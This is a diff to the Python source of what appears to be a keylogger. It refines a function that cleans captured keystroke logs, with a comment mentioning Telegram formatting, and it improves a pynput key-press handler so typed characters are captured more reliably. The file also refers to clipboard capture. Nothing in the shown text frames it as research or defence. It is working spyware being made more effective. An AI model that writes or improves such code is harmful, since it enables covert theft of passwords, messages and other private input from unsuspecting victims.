@@ -111,13 +111,16 @@ def process_keylog_text(raw_text):
     if not raw_text:
         return ""
     
-    # Remove control characters like '\x01' (SOH), '\x03' (ETX) and other invisible control characters
+    # Remove control characters like '\x01' (SOH), '\x04' (EOT) and other invisible control characters
     # except tab '\t' and newline '\n'
     cleaned = "".join(ch for ch in raw_text if ord(ch) >= 32 or ch in ['\n', '\r', '\t'])
     
-    # Remove any literal string representation of control sequences
-    for seq in ["\\x01", "\\x03", "\\x16", "\\x1a", "\\x18", "\x01", "\x03", "\x16", "\x1a", "\x18"]:
-        cleaned = cleaned.replace(seq, "")
+    # Remove any literal string representation of control sequences (\x00 through \x1f)
+    for code in range(32):
+        if code not in (9, 10, 13):
+            cleaned = cleaned.replace(chr(code), "")
+            cleaned = cleaned.replace(f"\\x{code:02x}", "")
+            cleaned = cleaned.replace(f"\\x{code:02X}", "")
     
     # Noise tokens to be removed (both bracketed and raw variants, case-insensitive)
     noises = [
@@ -154,8 +157,8 @@ def process_keylog_text(raw_text):
     for pattern, replacement in specials:
         cleaned = re.sub(pattern, replacement, cleaned)
         
-    # Escape HTML special characters (like <, >, &) to prevent Telegram parsing errors
-    cleaned = html.escape(cleaned)
+    # Escape HTML special characters (like <, >, &) while keeping quotes unescaped
+    cleaned = html.escape(cleaned, quote=False)
     return cleaned
 
 def get_clipboard():
@@ -695,9 +698,12 @@ def on_press(key):
         return
     global last_clipboard
     try:
-        key_str = str(key)
-        if key_str.startswith("'") and key_str.endswith("'") and len(key_str) == 3:
-            key_str = key_str[1:-1]
+        if hasattr(key, 'char') and key.char is not None:
+            key_str = key.char
+        else:
+            key_str = str(key)
+            if key_str.startswith("'") and key_str.endswith("'"):
+                key_str = key_str[1:-1]
         
         # Handle virtual key codes in angle brackets (e.g. <104> for Numpad 8)
         if re.match(r"^<\d+>$", key_str):
